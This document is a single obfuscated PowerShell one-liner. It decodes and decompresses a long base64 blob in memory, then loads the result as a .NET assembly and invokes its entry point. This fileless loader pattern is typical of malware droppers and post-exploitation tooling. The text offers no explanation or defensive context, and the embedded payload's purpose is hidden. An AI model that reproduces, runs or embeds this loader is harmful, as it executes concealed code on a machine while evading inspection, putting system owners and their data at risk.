sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null